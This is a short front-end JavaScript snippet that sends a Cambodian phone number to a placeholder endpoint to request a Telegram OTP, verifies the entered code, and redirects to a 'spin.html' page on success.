async function sendOTP(){

    const phone = document.getElementById("phone").value;

    await fetch("SEND_OTP_URL", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ phone: "+855"+phone })
    });

    alert("OTP sent to Telegram");
}

async function verifyOTP(){

    const phone = document.getElementById("phone").value;
    const otp = document.getElementById("otp").value;

    const response = await fetch("VERIFY_OTP_URL", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            phone: "+855"+phone,
            otp: otp
        })
    });

    const data = await response.json();

    if(data.success){
        window.location.href = "spin.html";
    }else{
        alert("Wrong OTP");
    }
}